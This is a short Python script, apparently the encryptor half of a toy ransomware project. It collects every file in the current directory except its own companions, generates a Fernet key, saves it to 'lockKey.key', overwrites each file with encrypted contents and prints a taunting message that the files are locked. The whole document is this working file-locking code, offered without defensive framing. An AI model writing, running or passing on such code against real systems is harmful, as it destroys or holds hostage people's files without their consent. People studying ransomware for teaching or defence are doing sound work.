import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
    if file == "Encrypt.py" or file == "lockKey.key" or file=="Decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
    
print(files)
# Let's crypt the files using cryptography library
# Using fernet lets generate the key 

key = Fernet.generate_key()

# print(key)

with open("lockKey.key", 'wb') as lockKey:
    lockKey.write(key)
    
for file in files:
    with open(file, 'rb') as lockKey:
        contents=lockKey.read()
    encrypted_content = Fernet(key).encrypt(contents)
    with open(file, 'wb') as lockKey:
        lockKey.write(encrypted_content)
    
print("You have it but you can't access it!!! All the file has been encrypted!\n")
